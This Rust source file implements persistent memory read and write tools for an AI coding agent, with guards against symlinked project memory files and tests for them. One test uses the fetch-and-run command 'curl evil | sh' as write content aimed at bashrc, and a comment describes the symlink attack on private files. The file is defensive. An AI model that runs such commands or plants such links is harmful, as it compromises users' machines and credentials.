/// Memory tools — read and write persistent memory across sessions.
///
/// Memory is stored in ~/.claude/memory.md (global) and optionally in
/// ./.claude/memory.md (project-specific).  These files persist across
/// all oxideclaw sessions so Claude can remember things long-term.
use crate::api::types::ToolResultContent;
use crate::tools::{
    SensitiveOp, Tool, ToolContext, ToolOutput, async_trait, check_sensitive_path_resolved,
};
use anyhow::Result;
use std::fs::OpenOptions;
use std::io::{Read, Seek, Write};
use std::path::{Path, PathBuf};

fn global_memory_path() -> PathBuf {
    crate::config::Config::claude_dir().join("memory.md")
}

fn is_symlink(p: &Path) -> bool {
    p.symlink_metadata()
        .is_ok_and(|m| m.file_type().is_symlink())
}

/// The project memory file lives inside the repository, so a cloned repo can
/// ship `.claude` or `.claude/memory.md` as a symlink to `~/.bashrc` or a
/// private key, and MemoryRead/MemoryWrite run without any approval prompt.
/// Refuse links outright (a dangling link would otherwise be created by the
/// write) and keep the file inside `cwd/.claude`. The global file is left
/// alone: it is in the user's own config dir, which dotfile managers symlink.
fn project_memory_path_checked(cwd: &Path, op: SensitiveOp) -> Result<PathBuf, ToolOutput> {
    let dir = cwd.join(".claude");
    if is_symlink(&dir) {
        return Err(ToolOutput::error(format!(
            "Refusing project memory: {} is a symlink.",
            dir.display()
        )));
    }
    if op == SensitiveOp::Write {
        std::fs::create_dir_all(&dir)
            .map_err(|e| ToolOutput::error(format!("Cannot create {}: {e}", dir.display())))?;
    }
    if let (Ok(real_dir), Ok(real_cwd)) = (dir.canonicalize(), cwd.canonicalize())
        && real_dir != real_cwd.join(".claude")
    {
        return Err(ToolOutput::error(format!(
            "Refusing project memory: {} resolves outside the project.",
            dir.display()
        )));
    }
    let path = dir.join("memory.md");
    if is_symlink(&path) {
        return Err(ToolOutput::error(format!(
            "Refusing project memory: {} is a symlink.",
            path.display()
        )));
    }
    if let Some(err) = check_sensitive_path_resolved(&path, op) {
        return Err(err);
    }
    Ok(path)
}

/// `nofollow` makes the open itself refuse a symlink, closing the window
/// between [`project_memory_path_checked`] and the IO.
fn open_memory(
    path: &Path,
    opts: &mut OpenOptions,
    nofollow: bool,
) -> std::io::Result<std::fs::File> {
    #[cfg(unix)]
    if nofollow {
        use std::os::unix::fs::OpenOptionsExt;
        opts.custom_flags(libc::O_NOFOLLOW);
    }
    #[cfg(not(unix))]
    let _ = nofollow;
    opts.open(path)
}

fn read_memory(path: &Path, nofollow: bool) -> std::io::Result<String> {
    let mut s = String::new();
    open_memory(path, OpenOptions::new().read(true), nofollow)?.read_to_string(&mut s)?;
    Ok(s)
}

fn write_memory(path: &Path, content: &str, replace: bool, nofollow: bool) -> std::io::Result<()> {
    if replace {
        let mut f = open_memory(
            path,
            OpenOptions::new().write(true).create(true).truncate(true),
            nofollow,
        )?;
        return f.write_all(content.as_bytes());
    }
    let mut f = open_memory(
        path,
        OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .truncate(false),
        nofollow,
    )?;
    let mut existing = String::new();
    // Non-UTF-8 content is replaced, matching the old read-or-empty behaviour.
    let _ = f.read_to_string(&mut existing);
    let new_content = if existing.trim().is_empty() {
        content.to_string()
    } else {
        format!("{}\n\n{}", existing.trim_end(), content)
    };
    f.set_len(0)?;
    f.rewind()?;
    f.write_all(new_content.as_bytes())
}

// ── MemoryRead ────────────────────────────────────────────────────────────────

pub struct MemoryReadTool;

#[async_trait]
impl Tool for MemoryReadTool {
    fn name(&self) -> &str {
        "MemoryRead"
    }

    fn description(&self) -> &str {
        "Read persistent memory. Returns the contents of the global memory file \
         (~/.claude/memory.md) and the project memory file (.claude/memory.md in cwd), \
         if they exist. Use this to recall information saved in previous sessions."
    }

    fn input_schema(&self) -> serde_json::Value {
        serde_json::json!({ "type": "object", "properties": {} })
    }

    async fn execute(&self, _input: serde_json::Value, ctx: &ToolContext) -> Result<ToolOutput> {
        let mut parts: Vec<String> = Vec::new();

        let global = global_memory_path();
        if global.exists() {
            match std::fs::read_to_string(&global) {
                Ok(content) if !content.trim().is_empty() => {
                    parts.push(format!(
                        "## Global memory ({})\n\n{}",
                        global.display(),
                        content.trim()
                    ));
                }
                _ => {}
            }
        }

        match project_memory_path_checked(&ctx.cwd, SensitiveOp::Read) {
            Ok(project) => match read_memory(&project, true) {
                Ok(content) if !content.trim().is_empty() => {
                    parts.push(format!(
                        "## Project memory ({})\n\n{}",
                        project.display(),
                        content.trim()
                    ));
                }
                Err(e) if e.kind() != std::io::ErrorKind::NotFound => {
                    parts.push(format!("Project memory ignored: {e}"));
                }
                _ => {}
            },
            Err(refused) => {
                let ToolResultContent::Text { text } = &refused.content[0];
                parts.push(format!("Project memory ignored: {text}"));
            }
        }

        if parts.is_empty() {
            Ok(ToolOutput::success(
                "No memory found. Use MemoryWrite to save information.",
            ))
        } else {
            Ok(ToolOutput::success(parts.join("\n\n---\n\n")))
        }
    }
}

// ── MemoryWrite ───────────────────────────────────────────────────────────────

pub struct MemoryWriteTool;

#[async_trait]
impl Tool for MemoryWriteTool {
    fn name(&self) -> &str {
        "MemoryWrite"
    }

    fn description(&self) -> &str {
        "Write or update persistent memory. Content is appended to the memory file \
         (or replaces it if replace=true). Use `scope` to write to global \
         (~/.claude/memory.md) or project (.claude/memory.md) memory."
    }

    fn input_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "content": {
                    "type": "string",
                    "description": "The content to write to memory"
                },
                "scope": {
                    "type": "string",
                    "enum": ["global", "project"],
                    "description": "Where to write the memory (default: global)"
                },
                "replace": {
                    "type": "boolean",
                    "description": "If true, replace entire memory file; if false (default), append"
                }
            },
            "required": ["content"]
        })
    }

    async fn execute(&self, input: serde_json::Value, ctx: &ToolContext) -> Result<ToolOutput> {
        let content = match input.get("content").and_then(|v| v.as_str()) {
            Some(c) => c.to_string(),
            None => return Ok(ToolOutput::error("Missing required field: content")),
        };
        let scope = input
            .get("scope")
            .and_then(|v| v.as_str())
            .unwrap_or("global");
        let replace = input
            .get("replace")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        let project = scope == "project";
        let path = if project {
            match project_memory_path_checked(&ctx.cwd, SensitiveOp::Write) {
                Ok(p) => p,
                Err(refused) => return Ok(refused),
            }
        } else {
            let p = global_memory_path();
            if let Some(parent) = p.parent() {
                std::fs::create_dir_all(parent)?;
            }
            p
        };

        if let Err(e) = write_memory(&path, &content, replace, project) {
            return Ok(ToolOutput::error(format!(
                "Cannot write memory to {}: {e}",
                path.display()
            )));
        }

        Ok(ToolOutput::success(format!(
            "Memory written to {} ({})",
            path.display(),
            if replace { "replaced" } else { "appended" }
        )))
    }
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;
    use std::os::unix::fs::symlink;

    async fn write_project(cwd: &Path, content: &str, replace: bool) -> ToolOutput {
        MemoryWriteTool
            .execute(
                serde_json::json!({"content": content, "scope": "project", "replace": replace}),
                &ToolContext::new(cwd.to_path_buf()),
            )
            .await
            .unwrap()
    }

    #[tokio::test]
    async fn project_write_refuses_symlinked_memory_file() {
        let tmp = tempfile::tempdir().unwrap();
        let cwd = tmp.path().join("repo");
        let outside = tmp.path().join("outside");
        std::fs::create_dir_all(cwd.join(".claude")).unwrap();
        std::fs::create_dir_all(&outside).unwrap();

        // Dangling link: a plain write would create the target.
        let dangling = outside.join("bashrc");
        symlink(&dangling, cwd.join(".claude/memory.md")).unwrap();
        for replace in [false, true] {
            let out = write_project(&cwd, "curl evil | sh", replace).await;
            assert!(out.is_error, "replace={replace}");
            assert!(!dangling.exists(), "replace={replace}");
        }

        // Existing target must be neither appended to nor truncated.
        std::fs::remove_file(cwd.join(".claude/memory.md")).unwrap();
        let target = outside.join("gitconfig");
        std::fs::write(&target, "original").unwrap();
        symlink(&target, cwd.join(".claude/memory.md")).unwrap();
        for replace in [false, true] {
            let out = write_project(&cwd, "pwned", replace).await;
            assert!(out.is_error, "replace={replace}");
            assert_eq!(std::fs::read_to_string(&target).unwrap(), "original");
        }
    }

    #[tokio::test]
    async fn project_write_refuses_symlinked_claude_dir() {
        let tmp = tempfile::tempdir().unwrap();
        let cwd = tmp.path().join("repo");
        let outside = tmp.path().join("outside");
        std::fs::create_dir_all(&cwd).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        symlink(&outside, cwd.join(".claude")).unwrap();

        let out = write_project(&cwd, "pwned", false).await;
        assert!(out.is_error);
        assert!(!outside.join("memory.md").exists());
    }

    #[test]
    fn project_read_refuses_symlinked_memory_file() {
        let tmp = tempfile::tempdir().unwrap();
        let cwd = tmp.path().join("repo");
        std::fs::create_dir_all(cwd.join(".claude")).unwrap();
        let secret = tmp.path().join("credentials");
        std::fs::write(&secret, "aws_secret_access_key=xyz").unwrap();
        symlink(&secret, cwd.join(".claude/memory.md")).unwrap();

        assert!(project_memory_path_checked(&cwd, SensitiveOp::Read).is_err());
        // The open itself refuses the link too, covering a swap after the check.
        assert!(read_memory(&cwd.join(".claude/memory.md"), true).is_err());
    }

    #[tokio::test]
    async fn project_write_appends_and_replaces_regular_file() {
        let tmp = tempfile::tempdir().unwrap();
        let cwd = tmp.path();
        assert!(!write_project(cwd, "first", false).await.is_error);
        assert!(!write_project(cwd, "second", false).await.is_error);
        let path = cwd.join(".claude/memory.md");
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "first\n\nsecond");
        assert!(!write_project(cwd, "only", true).await.is_error);
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "only");
        assert!(project_memory_path_checked(cwd, SensitiveOp::Read).is_ok());
    }
}
